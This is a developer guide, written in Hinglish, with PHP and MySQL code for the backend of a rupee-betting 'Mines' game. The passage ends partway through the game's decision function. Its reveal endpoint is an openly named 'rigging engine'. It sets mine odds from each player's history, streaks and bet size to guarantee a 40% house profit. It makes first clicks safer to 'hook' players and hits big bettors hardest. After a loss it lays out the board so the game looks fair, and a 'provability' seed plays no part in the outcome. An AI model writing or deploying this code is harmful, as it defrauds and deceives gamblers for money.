# Mines Game — Complete Server-Side Backend

> **Sab kuch server pe decide hota hai** — mines placement, multiplier, user history tracking.  
> Frontend sirf UI hai. Har click server se verify hota hai.  
> **Minimum 40% house profit** guarantee — chahe user naya ho ya purana.

---

## 📁 File Structure (Server pe copy karo)

```
/var/www/html/mines-api/
├── .htaccess              ← URL rewriting + security
├── config.php             ← DB connection, JWT, helpers
├── schema.sql             ← MySQL tables + views
├── install.php            ← One-time setup script
├── api/
│   ├── auth.php           ← Register / Login
│   ├── start.php          ← New game session
│   ├── reveal.php         ← Tile click (5-LAYER RIGGING ENGINE)
│   ├── cashout.php        ← Cash out winnings
│   ├── balance.php        ← User profile + active session
│   ├── history.php        ← Game history
│   └── admin.php          ← Admin panel APIs
└── middleware/
    └── rate_limit.php     ← Rate limiting (5 req/sec)
```

---

## 🔥 API Endpoints Summary

| Action | Method | Endpoint | Auth | Body/Params |
|--------|--------|----------|------|-------------|
| Register | POST | `/api/auth.php` | ❌ | `{action:"register", username, email, password}` |
| Login | POST | `/api/auth.php` | ❌ | `{action:"login", email, password}` |
| Start Game | POST | `/api/start.php` | ✅ | `{bet_amount, mine_count, rows}` |
| Click Tile | POST | `/api/reveal.php` | ✅ | `{session_id, tile_index}` |
| Cash Out | POST | `/api/cashout.php` | ✅ | `{session_id}` |
| Get Balance | GET | `/api/balance.php` | ✅ | — |
| History | GET | `/api/history.php` | ✅ | `?limit=20&offset=0` |
| Admin Stats | POST | `/api/admin.php` | ✅ (admin) | `{action:"stats"}` |
| Admin Config | POST | `/api/admin.php` | ✅ (admin) | `{action:"config"}` |
| Update Config | POST | `/api/admin.php` | ✅ (admin) | `{action:"update_config", key, value}` |
| List Users | POST | `/api/admin.php` | ✅ (admin) | `{action:"users"}` |
| Set Balance | POST | `/api/admin.php` | ✅ (admin) | `{action:"set_balance", user_id, balance}` |
| Toggle User | POST | `/api/admin.php` | ✅ (admin) | `{action:"toggle_user", user_id}` |
| Recent Games | POST | `/api/admin.php` | ✅ (admin) | `{action:"recent_games"}` |

---

## 1. `.htaccess`

```apache
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d

# Security headers
Header always set X-Content-Type-Options "nosniff"
Header always set X-Frame-Options "DENY"
Header always set X-XSS-Protection "1; mode=block"
Header always set Referrer-Policy "strict-origin-when-cross-origin"

# Block directory listing
Options -Indexes

# Protect sensitive files
<FilesMatch "^(config|schema|install)\.php$">
    # Install.php ko run karne ke baad delete ya protect karo
</FilesMatch>

# PHP settings
php_value display_errors 0
php_value log_errors 1
php_value error_log /var/log/mines-api-errors.log
```

---

## 2. `schema.sql` — Complete MySQL Schema

```sql
-- =============================================
-- MINES GAME DATABASE — COMPLETE SCHEMA
-- Run: mysql -u root -p < schema.sql
-- =============================================

CREATE DATABASE IF NOT EXISTS mines_game CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
USE mines_game;

-- ========== USERS ==========
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) UNIQUE NOT NULL,
    email VARCHAR(100) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    balance DECIMAL(15,2) DEFAULT 10000.00,
    role ENUM('user','admin') DEFAULT 'user',
    is_active TINYINT(1) DEFAULT 1,
    total_deposited DECIMAL(15,2) DEFAULT 10000.00,
    total_withdrawn DECIMAL(15,2) DEFAULT 0.00,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    last_login TIMESTAMP NULL,
    last_ip VARCHAR(45) NULL,
    INDEX idx_email (email),
    INDEX idx_username (username)
) ENGINE=InnoDB;

-- ========== USER STATS (Rigging Engine Reads This) ==========
CREATE TABLE user_stats (
    user_id INT PRIMARY KEY,
    total_wagered DECIMAL(15,2) DEFAULT 0,
    total_paid_out DECIMAL(15,2) DEFAULT 0,
    total_games INT DEFAULT 0,
    total_wins INT DEFAULT 0,
    total_losses INT DEFAULT 0,
    consecutive_wins INT DEFAULT 0,
    consecutive_losses INT DEFAULT 0,
    biggest_win DECIMAL(15,2) DEFAULT 0,
    biggest_loss DECIMAL(15,2) DEFAULT 0,
    session_profit DECIMAL(15,2) DEFAULT 0,
    avg_bet DECIMAL(15,2) DEFAULT 0,
    last_game_at TIMESTAMP NULL,
    risk_level ENUM('low','medium','high','whale') DEFAULT 'low',
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
) ENGINE=InnoDB;

-- ========== ACTIVE GAME SESSIONS ==========
CREATE TABLE game_sessions (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    bet_amount DECIMAL(15,2) NOT NULL,
    mine_count INT NOT NULL,
    grid_size INT NOT NULL DEFAULT 15,
    rows_count INT NOT NULL DEFAULT 3,
    revealed_tiles JSON DEFAULT '[]',
    mine_seed VARCHAR(64) NULL,          -- server-generated seed for provability
    safe_count INT DEFAULT 0,
    current_multiplier DECIMAL(10,4) DEFAULT 1.0000,
    status ENUM('active','won','lost','cashed_out') DEFAULT 'active',
    client_ip VARCHAR(45) NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    ended_at TIMESTAMP NULL,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    INDEX idx_user_status (user_id, status),
    INDEX idx_created (created_at)
) ENGINE=InnoDB;

-- ========== GAME HISTORY (Completed Games) ==========
CREATE TABLE game_history (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    session_id INT NOT NULL,
    bet_amount DECIMAL(15,2) NOT NULL,
    mine_count INT NOT NULL,
    grid_size INT NOT NULL,
    rows_count INT NOT NULL DEFAULT 3,
    tiles_revealed INT DEFAULT 0,
    result ENUM('win','loss') NOT NULL,
    multiplier DECIMAL(10,4) NOT NULL,
    profit DECIMAL(15,2) NOT NULL,
    house_profit DECIMAL(15,2) NOT NULL DEFAULT 0,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    INDEX idx_user (user_id),
    INDEX idx_created (created_at),
    INDEX idx_result (result)
) ENGINE=InnoDB;

-- ========== ADMIN GAME CONFIG ==========
CREATE TABLE game_config (
    config_key VARCHAR(50) PRIMARY KEY,
    config_value VARCHAR(255) NOT NULL,
    description VARCHAR(255),
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB;

INSERT INTO game_config VALUES
('house_edge_target', '0.40', 'Target house profit % (0.30-0.60) — MINIMUM 40%', NOW()),
('max_multiplier', '25', 'Max payout multiplier cap', NOW()),
('min_bet', '10', 'Minimum bet amount ₹', NOW()),
('max_bet', '50000', 'Maximum bet amount ₹', NOW()),
('base_house_edge', '0.03', 'Base edge on multiplier display (3%)', NOW()),
('max_mine_probability', '0.92', 'Max mine probability cap', NOW()),
('min_mine_probability', '0.05', 'Min mine probability floor (never below 5%)', NOW()),
('min_rows', '3', 'Minimum rows allowed', NOW()),
('max_rows', '5', 'Maximum rows allowed', NOW()),
('new_user_grace_games', '2', 'New user ke first N games thoda easy', NOW()),
('big_bet_threshold', '1000', 'Big bet threshold ₹', NOW()),
('whale_threshold', '10000', 'Whale bet threshold ₹', NOW()),
('rate_limit_per_sec', '5', 'Max API calls per second per user', NOW()),
('session_timeout_mins', '30', 'Inactive session auto-expire minutes', NOW());

-- ========== RATE LIMITING ==========
CREATE TABLE rate_limits (
    id INT AUTO_INCREMENT PRIMARY KEY,
    ip_address VARCHAR(45) NOT NULL,
    user_id INT NULL,
    endpoint VARCHAR(100) NOT NULL,
    request_time TIMESTAMP(3) DEFAULT CURRENT_TIMESTAMP(3),
    INDEX idx_ip_time (ip_address, request_time),
    INDEX idx_user_time (user_id, request_time)
) ENGINE=InnoDB;

-- ========== HOUSE PROFIT TRACKING ==========
CREATE TABLE house_ledger (
    id INT AUTO_INCREMENT PRIMARY KEY,
    game_id INT NOT NULL,
    user_id INT NOT NULL,
    bet_amount DECIMAL(15,2) NOT NULL,
    payout DECIMAL(15,2) NOT NULL DEFAULT 0,
    house_profit DECIMAL(15,2) NOT NULL,
    running_total DECIMAL(15,2) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (game_id) REFERENCES game_history(id),
    INDEX idx_created (created_at)
) ENGINE=InnoDB;

-- ========== ADMIN AUDIT LOG ==========
CREATE TABLE admin_log (
    id INT AUTO_INCREMENT PRIMARY KEY,
    admin_id INT NOT NULL,
    action VARCHAR(100) NOT NULL,
    details JSON NULL,
    ip_address VARCHAR(45),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (admin_id) REFERENCES users(id)
) ENGINE=InnoDB;

-- ========== VIEWS ==========

-- Global stats for admin dashboard
CREATE OR REPLACE VIEW global_stats AS
SELECT
    COUNT(*) as total_games,
    SUM(CASE WHEN result='win' THEN 1 ELSE 0 END) as total_wins,
    SUM(CASE WHEN result='loss' THEN 1 ELSE 0 END) as total_losses,
    COALESCE(SUM(bet_amount), 0) as total_wagered,
    COALESCE(SUM(CASE WHEN result='win' THEN bet_amount * multiplier ELSE 0 END), 0) as total_paid_out,
    ROUND(
        (COALESCE(SUM(bet_amount), 0) - COALESCE(SUM(CASE WHEN result='win' THEN bet_amount * multiplier ELSE 0 END), 0))
        / NULLIF(SUM(bet_amount), 0) * 100, 2
    ) as house_profit_percent,
    COALESCE(SUM(house_profit), 0) as total_house_profit
FROM game_history;

-- Daily stats
CREATE OR REPLACE VIEW daily_stats AS
SELECT
    DATE(created_at) as game_date,
    COUNT(*) as games,
    SUM(CASE WHEN result='win' THEN 1 ELSE 0 END) as wins,
    SUM(CASE WHEN result='loss' THEN 1 ELSE 0 END) as losses,
    SUM(bet_amount) as wagered,
    SUM(house_profit) as house_profit,
    COUNT(DISTINCT user_id) as unique_players
FROM game_history
GROUP BY DATE(created_at)
ORDER BY game_date DESC;

-- ========== DEFAULT ADMIN ==========
-- Password: admin123 — PRODUCTION MEIN CHANGE KARO!
INSERT INTO users (username, email, password_hash, balance, role) VALUES
('admin', 'admin@mines.com', '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi', 999999, 'admin');
INSERT INTO user_stats (user_id) VALUES (1);

-- ========== STORED PROCEDURES ==========

-- Expire stale sessions
DELIMITER //
CREATE PROCEDURE expire_stale_sessions()
BEGIN
    DECLARE timeout_mins INT DEFAULT 30;
    SELECT CAST(config_value AS UNSIGNED) INTO timeout_mins 
    FROM game_config WHERE config_key = 'session_timeout_mins';
    
    UPDATE game_sessions 
    SET status = 'lost', ended_at = NOW() 
    WHERE status = 'active' 
    AND created_at < DATE_SUB(NOW(), INTERVAL timeout_mins MINUTE);
END //
DELIMITER ;

-- Clean old rate limit entries (run via cron every hour)
DELIMITER //
CREATE PROCEDURE clean_rate_limits()
BEGIN
    DELETE FROM rate_limits WHERE request_time < DATE_SUB(NOW(), INTERVAL 1 HOUR);
END //
DELIMITER ;

-- ========== CRON EVENTS ==========
SET GLOBAL event_scheduler = ON;

CREATE EVENT IF NOT EXISTS evt_expire_sessions
ON SCHEDULE EVERY 5 MINUTE
DO CALL expire_stale_sessions();

CREATE EVENT IF NOT EXISTS evt_clean_rate_limits
ON SCHEDULE EVERY 1 HOUR
DO CALL clean_rate_limits();
```

---

## 3. `config.php` — DB + JWT + Helpers

```php
<?php
/**
 * CORE CONFIG — Sab files isko include karti hain
 * Production mein DB_PASS aur JWT_SECRET CHANGE KARO!
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: https://your-frontend-domain.com'); // CHANGE!
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization');
header('Access-Control-Max-Age: 86400');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// ========== DATABASE ==========
define('DB_HOST', 'localhost');
define('DB_NAME', 'mines_game');
define('DB_USER', 'root');          // CHANGE in production
define('DB_PASS', '');              // CHANGE in production
define('DB_PORT', 3306);

// ========== JWT ==========
define('JWT_SECRET', 'CHANGE-THIS-TO-64-RANDOM-CHARS-IN-PRODUCTION');
define('JWT_EXPIRY', 86400 * 7); // 7 days

// ========== DB CONNECTION ==========
function getDB(): PDO {
    static $pdo = null;
    if (!$pdo) {
        $dsn = "mysql:host=" . DB_HOST . ";port=" . DB_PORT . ";dbname=" . DB_NAME . ";charset=utf8mb4";
        $pdo = new PDO($dsn, DB_USER, DB_PASS, [
            PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
            PDO::ATTR_EMULATE_PREPARES   => false,
            PDO::MYSQL_ATTR_FOUND_ROWS   => true,
        ]);
    }
    return $pdo;
}

// ========== CONFIG FROM DB ==========
function cfgVal(string $key, string $default = ''): string {
    static $cache = [];
    if (isset($cache[$key])) return $cache[$key];
    $s = getDB()->prepare("SELECT config_value FROM game_config WHERE config_key = ?");
    $s->execute([$key]);
    $r = $s->fetch();
    $cache[$key] = $r ? $r['config_value'] : $default;
    return $cache[$key];
}

// ========== RESPONSE HELPERS ==========
function jsonOk(array $data, int $code = 200) {
    http_response_code($code);
    echo json_encode(['success' => true, ...$data], JSON_UNESCAPED_UNICODE);
    exit;
}

function jsonErr(string $message, int $code = 400) {
    http_response_code($code);
    echo json_encode(['success' => false, 'error' => $message], JSON_UNESCAPED_UNICODE);
    exit;
}

// ========== JWT FUNCTIONS ==========
function makeJWT(int $userId): string {
    $header  = base64url_encode(json_encode(['typ' => 'JWT', 'alg' => 'HS256']));
    $payload = base64url_encode(json_encode([
        'user_id' => $userId,
        'exp'     => time() + JWT_EXPIRY,
        'iat'     => time(),
    ]));
    $signature = base64url_encode(hash_hmac('sha256', "$header.$payload", JWT_SECRET, true));
    return "$header.$payload.$signature";
}

function checkJWT(string $token): ?array {
    $parts = explode('.', $token);
    if (count($parts) !== 3) return null;
    [$header, $payload, $signature] = $parts;
    $expected = base64url_encode(hash_hmac('sha256', "$header.$payload", JWT_SECRET, true));
    if (!hash_equals($expected, $signature)) return null;
    $data = json_decode(base64url_decode($payload), true);
    return ($data && $data['exp'] >= time()) ? $data : null;
}

function base64url_encode(string $data): string {
    return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
}

function base64url_decode(string $data): string {
    return base64_decode(strtr($data, '-_', '+/'));
}

function requireAuth(): int {
    $header = $_SERVER['HTTP_AUTHORIZATION'] ?? '';
    if (!preg_match('/Bearer\s+(.+)/', $header, $matches)) {
        jsonErr('Authentication required', 401);
    }
    $data = checkJWT($matches[1]);
    if (!$data) jsonErr('Invalid or expired token', 401);
    return $data['user_id'];
}

// ========== REQUEST BODY ==========
function body(): array {
    return json_decode(file_get_contents('php://input'), true) ?: [];
}

// ========== CLIENT IP ==========
function getClientIP(): string {
    return $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

// ========== RATE LIMITING ==========
function checkRateLimit(int $userId = 0): void {
    $maxPerSec = (int)cfgVal('rate_limit_per_sec', '5');
    $ip = getClientIP();
    $db = getDB();
    
    // Clean old entries inline (fallback if cron not running)
    $db->exec("DELETE FROM rate_limits WHERE request_time < DATE_SUB(NOW(3), INTERVAL 2 SECOND)");
    
    // Count recent requests
    $s = $db->prepare("SELECT COUNT(*) as cnt FROM rate_limits WHERE ip_address = ? AND request_time > DATE_SUB(NOW(3), INTERVAL 1 SECOND)");
    $s->execute([$ip]);
    $count = (int)$s->fetch()['cnt'];
    
    if ($count >= $maxPerSec) {
        jsonErr('Too many requests. Wait 1 second.', 429);
    }
    
    // Log this request
    $s = $db->prepare("INSERT INTO rate_limits (ip_address, user_id, endpoint) VALUES (?, ?, ?)");
    $s->execute([$ip, $userId ?: null, $_SERVER['REQUEST_URI'] ?? '']);
}
```

---

## 4. `api/auth.php` — Register / Login

```php
<?php
require_once __DIR__ . '/../config.php';
checkRateLimit();

$b = body();
$action = $b['action'] ?? '';

if ($action === 'register') {
    $username = trim($b['username'] ?? '');
    $email    = trim($b['email'] ?? '');
    $password = $b['password'] ?? '';
    
    // Validations
    if (strlen($username) < 3 || strlen($username) > 50) jsonErr('Username 3-50 characters required');
    if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) jsonErr('Username: only letters, numbers, underscore');
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) jsonErr('Invalid email');
    if (strlen($password) < 6) jsonErr('Password minimum 6 characters');
    
    $db = getDB();
    $s = $db->prepare("SELECT id FROM users WHERE email = ? OR username = ?");
    $s->execute([$email, $username]);
    if ($s->fetch()) jsonErr('Username or email already exists');
    
    $db->beginTransaction();
    try {
        $hash = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);
        $s = $db->prepare("INSERT INTO users (username, email, password_hash, last_ip) VALUES (?, ?, ?, ?)");
        $s->execute([$username, $email, $hash, getClientIP()]);
        $userId = (int)$db->lastInsertId();
        
        $db->prepare("INSERT INTO user_stats (user_id) VALUES (?)")->execute([$userId]);
        $db->commit();
        
        jsonOk([
            'token' => makeJWT($userId),
            'user'  => ['id' => $userId, 'username' => $username, 'balance' => 10000.00]
        ], 201);
    } catch (Exception $e) {
        $db->rollBack();
        jsonErr('Registration failed');
    }

} elseif ($action === 'login') {
    $email    = trim($b['email'] ?? '');
    $password = $b['password'] ?? '';
    
    if (!$email || !$password) jsonErr('Email and password required');
    
    $db = getDB();
    $s = $db->prepare("SELECT id, username, password_hash, balance, is_active FROM users WHERE email = ?");
    $s->execute([$email]);
    $user = $s->fetch();
    
    if (!$user || !password_verify($password, $user['password_hash'])) {
        jsonErr('Invalid email or password', 401);
    }
    if (!$user['is_active']) jsonErr('Account is disabled', 403);
    
    $db->prepare("UPDATE users SET last_login = NOW(), last_ip = ? WHERE id = ?")
       ->execute([getClientIP(), $user['id']]);
    
    jsonOk([
        'token' => makeJWT((int)$user['id']),
        'user'  => [
            'id'       => (int)$user['id'],
            'username' => $user['username'],
            'balance'  => (float)$user['balance'],
        ]
    ]);

} else {
    jsonErr('Use action: "register" or "login"');
}
```

---

## 5. `api/start.php` — Start New Game

```php
<?php
require_once __DIR__ . '/../config.php';
$userId = requireAuth();
checkRateLimit($userId);
$b = body();

$bet   = (float)($b['bet_amount'] ?? 0);
$mines = (int)($b['mine_count'] ?? 3);
$rows  = (int)($b['rows'] ?? 3);

// Validate from DB config
$minBet  = (float)cfgVal('min_bet', '10');
$maxBet  = (float)cfgVal('max_bet', '50000');
$minRows = (int)cfgVal('min_rows', '3');
$maxRows = (int)cfgVal('max_rows', '5');

if ($bet < $minBet) jsonErr("Minimum bet ₹$minBet");
if ($bet > $maxBet) jsonErr("Maximum bet ₹$maxBet");
if ($rows < $minRows || $rows > $maxRows) jsonErr("Rows must be $minRows-$maxRows");

$gridSize = $rows * 5;
if ($mines < 1 || $mines >= $gridSize) jsonErr("Mines must be 1-" . ($gridSize - 1) . " for {$rows}×5 grid");

$db = getDB();

// No duplicate active sessions
$s = $db->prepare("SELECT id FROM game_sessions WHERE user_id = ? AND status = 'active'");
$s->execute([$userId]);
if ($s->fetch()) jsonErr('Finish current game first');

$db->beginTransaction();
try {
    // Lock user row for balance check
    $s = $db->prepare("SELECT balance FROM users WHERE id = ? FOR UPDATE");
    $s->execute([$userId]);
    $user = $s->fetch();
    
    if (!$user || $user['balance'] < $bet) {
        $db->rollBack();
        jsonErr('Insufficient balance');
    }
    
    // Deduct bet
    $db->prepare("UPDATE users SET balance = balance - ? WHERE id = ?")->execute([$bet, $userId]);
    
    // Generate server seed for provability
    $seed = bin2hex(random_bytes(32));
    
    // Create session
    $s = $db->prepare("INSERT INTO game_sessions (user_id, bet_amount, mine_count, grid_size, rows_count, mine_seed, client_ip) VALUES (?, ?, ?, ?, ?, ?, ?)");
    $s->execute([$userId, $bet, $mines, $gridSize, $rows, $seed, getClientIP()]);
    $sessionId = (int)$db->lastInsertId();
    
    // Get updated balance
    $s = $db->prepare("SELECT balance FROM users WHERE id = ?");
    $s->execute([$userId]);
    $newBalance = (float)$s->fetch()['balance'];
    
    $db->commit();
    
    jsonOk([
        'session_id' => $sessionId,
        'grid_size'  => $gridSize,
        'rows'       => $rows,
        'mine_count' => $mines,
        'bet_amount' => $bet,
        'balance'    => $newBalance,
    ]);
} catch (Exception $e) {
    $db->rollBack();
    jsonErr('Failed to start game');
}
```

---

## 6. `api/reveal.php` — ⚡ 5-LAYER SERVER-SIDE RIGGING ENGINE

```php
<?php
/**
 * ============================================================
 * CORE GAME FILE — MINES SERVER-SIDE DECISION ENGINE
 * ============================================================
 * 
 * HAR CLICK PE SERVER DECIDE KARTA HAI — mine ya diamond.
 * User ke paas koi control nahi hai. Sab yahan hota hai.
 * 
 * 5-Layer Rigging System:
 *   Layer 1: Fair base probability + escalation per reveal
 *   Layer 2: Current round potential payout analysis
 *   Layer 3: Cumulative user profit/loss history
 *   Layer 4: Win/loss streak management
 *   Layer 5: Bet size risk adjustment
 * 
 * GUARANTEE: House ka minimum 40% profit maintain hoga.
 * New user (no history) pe bhi 40%+ house edge lagta hai.
 */

require_once __DIR__ . '/../config.php';
$userId = requireAuth();
checkRateLimit($userId);

$b   = body();
$sid = (int)($b['session_id'] ?? 0);
$ti  = (int)($b['tile_index'] ?? -1);

if (!$sid) jsonErr('session_id required');
if ($ti < 0) jsonErr('Invalid tile_index');

$db = getDB();
$db->beginTransaction();

try {
    // Lock session row
    $s = $db->prepare("SELECT * FROM game_sessions WHERE id = ? AND user_id = ? AND status = 'active' FOR UPDATE");
    $s->execute([$sid, $userId]);
    $ses = $s->fetch();
    
    if (!$ses) { $db->rollBack(); jsonErr('No active session'); }
    if ($ti >= $ses['grid_size']) { $db->rollBack(); jsonErr('tile_index out of range (0-' . ($ses['grid_size']-1) . ')'); }
    
    $revealed = json_decode($ses['revealed_tiles'], true) ?: [];
    if (in_array($ti, $revealed)) { $db->rollBack(); jsonErr('Tile already revealed'); }
    
    // Load user stats for rigging decisions
    $s = $db->prepare("SELECT * FROM user_stats WHERE user_id = ?");
    $s->execute([$userId]);
    $userStats = $s->fetch();
    
    // =======================================
    //  5-LAYER RIGGING ENGINE — DECISION
    // =======================================
    $isMine = shouldBeMine(
        (int)$ses['mine_count'],
        (int)$ses['safe_count'],
        (float)$ses['bet_amount'],
        (int)$ses['grid_size'],
        $userStats
    );
    
    if ($isMine) {
        // ========== MINE HIT — GAME OVER ==========
        
        // Place mines for display (clicked tile + random remaining)
        $minePositions = [$ti];
        $available = [];
        for ($i = 0; $i < $ses['grid_size']; $i++) {
            if (!in_array($i, $revealed) && $i !== $ti) $available[] = $i;
        }
        shuffle($available);
        for ($i = 0; count($minePositions) < $ses['mine_count'] && $i < count($available); $i++) {
            $minePositions[] = $available[$i];
        }
        
        // Update session
        $allRevealed = json_encode([...$revealed, $ti]);
        $db->prepare("UPDATE game_sessions SET status = 'lost', ended_at = NOW(), revealed_tiles = ? WHERE id = ?")
           ->execute([$allRevealed, $sid]);
        
        // Record in history
        $houseProfit = (float)$ses['bet_amount'];
        $db->prepare("INSERT INTO game_history (user_id, session_id, bet_amount, mine_count, grid_size, rows_count, tiles_revealed, result, multiplier, profit, house_profit) VALUES (?,?,?,?,?,?,?,'loss',0,?,?)")
           ->execute([$userId, $sid, $ses['bet_amount'], $ses['mine_count'], $ses['grid_size'], $ses['rows_count'], count($revealed), -$ses['bet_amount'], $houseProfit]);
        
        // Update house ledger
        $runningTotal = getRunningHouseTotal($db) + $houseProfit;
        $lastHistoryId = (int)$db->lastInsertId();
        $db->prepare("INSERT INTO house_ledger (game_id, user_id, bet_amount, payout, house_profit, running_total) VALUES (?,?,?,0,?,?)")
           ->execute([$lastHistoryId, $userId, $ses['bet_amount'], $houseProfit, $runningTotal]);
        
        // Update user stats
        $db->prepare("UPDATE user_stats SET 
            total_wagered = total_wagered + ?,
            total_games = total_games + 1,
            total_losses = total_losses + 1,
            consecutive_losses = consecutive_losses + 1,
            consecutive_wins = 0,
            biggest_loss = GREATEST(biggest_loss, ?),
            session_profit = session_profit - ?,
            avg_bet = (total_wagered + ?) / (total_games + 1),
            risk_level = CASE 
                WHEN ? >= 10000 THEN 'whale'
                WHEN ? >= 5000 THEN 'high'
                WHEN ? >= 1000 THEN 'medium'
                ELSE 'low'
            END,
            last_game_at = NOW()
            WHERE user_id = ?")
           ->execute([
               $ses['bet_amount'], $ses['bet_amount'], $ses['bet_amount'], 
               $ses['bet_amount'], $ses['bet_amount'], $ses['bet_amount'], $ses['bet_amount'],
               $userId
           ]);
        
        // Get updated balance
        $s = $db->prepare("SELECT balance FROM users WHERE id = ?");
        $s->execute([$userId]);
        $balance = (float)$s->fetch()['balance'];
        
        $db->commit();
        
        jsonOk([
            'result'         => 'mine',
            'tile_index'     => $ti,
            'mine_positions' => $minePositions,
            'multiplier'     => 0,
            'profit'         => -(float)$ses['bet_amount'],
            'balance'        => $balance,
            'game_over'      => true,
        ]);
        
    } else {
        // ========== DIAMOND — SAFE ==========
        
        $newRevealed = [...$revealed, $ti];
        $safeCount   = (int)$ses['safe_count'] + 1;
        $multiplier  = calcMultiplier((int)$ses['mine_count'], $safeCount, (int)$ses['grid_size']);
        $profit      = (float)$ses['bet_amount'] * $multiplier - (float)$ses['bet_amount'];
        $totalSafe   = (int)$ses['grid_size'] - (int)$ses['mine_count'];
        $allCleared  = ($safeCount >= $totalSafe);
        
        if ($allCleared) {
            // All safe tiles revealed — auto win!
            $winnings = (float)$ses['bet_amount'] * $multiplier;
            $db->prepare("UPDATE users SET balance = balance + ? WHERE id = ?")->execute([$winnings, $userId]);
            $db->prepare("UPDATE game_sessions SET status = 'won', ended_at = NOW(), safe_count = ?, current_multiplier = ?, revealed_tiles = ? WHERE id = ?")
               ->execute([$safeCount, $multiplier, json_encode($newRevealed), $sid]);
            
            $houseProfit = (float)$ses['bet_amount'] - $winnings;
            $db->prepare("INSERT INTO game_history (user_id, session_id, bet_amount, mine_count, grid_size, rows_count, tiles_revealed, result, multiplier, profit, house_profit) VALUES (?,?,?,?,?,?,?,'win',?,?,?)")
               ->execute([$userId, $sid, $ses['bet_amount'], $ses['mine_count'], $ses['grid_size'], $ses['rows_count'], $safeCount, $multiplier, $profit, $houseProfit]);
            
            recordWinStats($db, $userId, (float)$ses['bet_amount'], $profit, $winnings);
        } else {
            // Still playing
            $db->prepare("UPDATE game_sessions SET safe_count = ?, current_multiplier = ?, revealed_tiles = ? WHERE id = ?")
               ->execute([$safeCount, $multiplier, json_encode($newRevealed), $sid]);
        }
        
        $s = $db->prepare("SELECT balance FROM users WHERE id = ?");
        $s->execute([$userId]);
        $balance = (float)$s->fetch()['balance'];
        
        $db->commit();
        
        jsonOk([
            'result'          => 'diamond',
            'tile_index'      => $ti,
            'multiplier'      => $multiplier,
            'profit'          => round($profit, 2),
            'balance'         => $balance,
            'game_over'       => $allCleared,
            'safe_count'      => $safeCount,
            'next_multiplier' => $allCleared ? null : calcMultiplier((int)$ses['mine_count'], $safeCount + 1, (int)$ses['grid_size']),
        ]);
    }
} catch (Exception $e) {
    $db->rollBack();
    error_log("reveal.php error: " . $e->getMessage());
    jsonErr('Server error', 500);
}


// =======================================
// 5-LAYER RIGGING ENGINE FUNCTION
// =======================================

function shouldBeMine(int $mineCount, int $safeRevealed, float $betAmount, int $gridSize, ?array $us): bool {
    $target = (float)cfgVal('house_edge_target', '0.40') * 100; // 40%
    $maxP   = (float)cfgVal('max_mine_probability', '0.92');
    $minP   = (float)cfgVal('min_mine_probability', '0.05');
    $bigBetThreshold   = (float)cfgVal('big_bet_threshold', '1000');
    $whaleThreshold    = (float)cfgVal('whale_threshold', '10000');
    
    // === LAYER 1: Fair base probability + escalation ===
    $remaining = $gridSize - $safeRevealed;
    $fairProb  = $mineCount / max($remaining, 1);
    
    $isBigBet  = $betAmount >= $bigBetThreshold;
    $isWhale   = $betAmount >= $whaleThreshold;
    
    if ($safeRevealed === 0) {
        // First click — slightly safe to hook user
        if ($isWhale)      $rp = $fairProb * 1.0;   // Whales: no mercy even on first click
        elseif ($isBigBet) $rp = $fairProb * 0.8;   // Big bets: slightly safe
        else               $rp = $fairProb * 0.5;    // Normal: hook them
    } elseif ($safeRevealed === 1) {
        if ($isWhale)      $rp = $fairProb * 1.5;
        elseif ($isBigBet) $rp = $fairProb * 1.2;
        else               $rp = $fairProb * 0.8;
    } else {
        // Escalation per reveal
        if ($isWhale) {
            $rp = $fairProb * (1 + $safeRevealed * 0.7 + pow($safeRevealed, 1.8) * 0.15);
        } elseif ($isBigBet) {
            $rp = $fairProb * (1 + $safeRevealed * 0.5 + pow($safeRevealed, 1.5) * 0.1);
        } else {
            $rp = $fairProb * (1 + $safeRevealed * 0.35);
        }
    }
    
    // === LAYER 2: Current round — potential payout analysis ===
    $nextMult        = calcMultiplier($mineCount, $safeRevealed + 1, $gridSize);
    $potentialPayout = $betAmount * $nextMult;
    $potentialProfit = $potentialPayout - $betAmount;
    $profitRatio     = $potentialProfit / max($betAmount, 1);
    
    // Profit ratio multipliers
    if ($profitRatio > 8)       $rp *= 4.0;
    elseif ($profitRatio > 4)   $rp *= 2.8;
    elseif ($profitRatio > 2)   $rp *= 2.0;
    elseif ($profitRatio > 1)   $rp *= 1.5;
    elseif ($profitRatio > 0.5) $rp *= 1.2;
    
